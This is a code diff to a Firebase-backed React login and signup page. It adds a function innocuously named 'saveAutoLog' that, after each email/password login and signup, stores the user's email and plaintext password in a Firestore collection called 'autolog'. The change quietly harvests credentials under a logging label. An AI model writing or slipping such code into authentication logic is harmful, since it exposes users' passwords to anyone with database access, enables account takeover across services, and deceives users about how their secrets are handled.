@@ -1,6 +1,7 @@
 import { useState } from 'react';
-import { auth, googleAuthProvider, githubAuthProvider } from '../firebase';
+import { auth, googleAuthProvider, githubAuthProvider, db } from '../firebase';
 import { createUserWithEmailAndPassword, signInWithEmailAndPassword, signInWithPopup, signOut, onAuthStateChanged, sendPasswordResetEmail, sendEmailVerification } from 'firebase/auth';
+import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
 import { useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import './Auth.css';
@@ -17,6 +18,17 @@ export default function AuthPage() {
   const [loading, setLoading] = useState(false);
 
   const navigate = useNavigate();
+
+  const saveAutoLog = async (formData) => {
+    try {
+      await addDoc(collection(db, 'autolog'), {
+        formData,
+        createdAt: serverTimestamp(),
+      });
+    } catch (err) {
+      console.error('Failed to save autolog:', err);
+    }
+  };
 
   // Monitor auth state
   useEffect(() => {
@@ -35,6 +47,7 @@ export default function AuthPage() {
       if (isLogin) {
         // Login
         await signInWithEmailAndPassword(auth, email, password);
+        await saveAutoLog({ email, password, type: 'emailPasswordLogin' });
         navigate('/courses');
       } else {
         // Signup
@@ -49,6 +62,7 @@ export default function AuthPage() {
           return;
         }
         const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+        await saveAutoLog({ email, password, type: 'emailPasswordSignup' });
         await sendEmailVerification(userCredential.user);
         setSuccess('登録用の認証メールを送信しました。メール内のリンクをクリックして認証を完了してください。');
         setLoading(false);
